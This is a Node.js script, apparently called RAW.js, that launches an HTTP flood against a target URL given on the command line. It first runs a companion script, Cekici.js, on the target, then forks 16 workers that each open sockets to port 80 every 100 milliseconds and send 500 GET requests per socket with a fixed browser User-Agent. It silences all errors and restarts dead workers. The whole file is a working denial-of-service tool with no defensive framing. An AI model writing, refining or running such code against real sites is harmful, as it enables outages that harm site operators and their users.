const fs = require("fs");
const url = require("url");
const net = require("net");
const cluster = require("cluster");
const { exec } = require("child_process");

const numCPUs = 16;

if (process.argv.length <= 2) {
    console.log("node RAW.js url time");
    process.exit(-1);
}

const target = process.argv[2];
const parsed = url.parse(target);
const host = url.parse(target).host;
const time = parseInt(process.argv[3], 10);

const fixedUserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36";

process.on("uncaughtException", function () {});
process.on("unhandledRejection", function () {});

if (cluster.isMaster) {
    console.log(`Master ${process.pid} is running`);

    // Cekici.js'i çalıştır
    exec(`node Cekici.js ${target}`, (error, stdout, stderr) => {
        if (error) {
            console.error(`Cekici.js hatası: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`Cekici.js stderr: ${stderr}`);
            return;
        }
        console.log(`Cekici.js sonucu: ${stdout}`);

        // Cekici.js tamamlandıktan sonra workerları başlat
        for (let i = 0; i < numCPUs; i++) {
            cluster.fork();
        }

        cluster.on("exit", (worker, code, signal) => {
            console.log(`Worker ${worker.process.pid} died`);
            cluster.fork();
        });
    });
} else {
    console.log(`Worker ${process.pid} started`);
    const int = setInterval(() => {
        const s = new net.Socket();
        s.connect(80, host);
        s.setTimeout(10000);

        for (let i = 0; i < 500; i++) {
            s.write(
                "GET " +
                    target +
                    " HTTP/1.1\r\nHost: " +
                    parsed.host +
                    "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUser-Agent: " +
                    fixedUserAgent +
                    "\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n"
            );
        }

        s.on("data", function () {
            setTimeout(() => s.destroy(), 5000);
        });

        s.on("error", () => s.destroy());
    }, 100);

    setTimeout(() => clearInterval(int), time * 1000);
}
